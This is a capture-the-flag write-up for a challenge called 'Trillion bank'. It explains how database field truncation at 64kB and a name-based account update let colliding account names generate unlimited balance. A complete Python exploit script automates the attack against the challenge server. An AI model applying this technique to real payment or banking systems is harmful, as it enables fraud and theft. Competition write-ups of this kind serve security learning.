### Trillion bank

Due to vulnerability in sending money it was possible to generate any balance (e.g. trilion$) used to get the flag.
Target account was correctly verified if ID is different than current, however target account was updated based on their name instead of ID.

By default database has limits how much information each field can store, in this case it was `TEXT` field that could hold only 64kB and anything beyond that was truncated.
We've exploited this fact by creating accounts with same prefix (name) for first 64kB and bypassing same name check that didn't had 64kB limit. Each money transfer is generating additional money to the other accounts.

Our exploit:

```py
import requests


url = 'http://trillion.seccon.games:3000'
# url = 'http://127.0.0.1:3000'

PAYLOAD = 'justcatthefish007'
PAYLOAD += (0xFFFF - len(PAYLOAD)) * 'q'

sessions = []
for x in range(3):
    s = requests.session()
    if x == 0: x = ''
    s.post(url + '/api/register', json={'name': PAYLOAD + str(x)})
    sessions.append(s)


balance = [10, 10]
while True:
    for x in range(2):
        sessions[x+1].post(url + '/api/transfer', json={'recipientName': PAYLOAD, 'amount': balance[x]})
        balance[(x+1)%2] += balance[x]

    try:
        print(sessions[0].get(url + '/api/me').json()['flag'])
        break
    except:
        pass
```
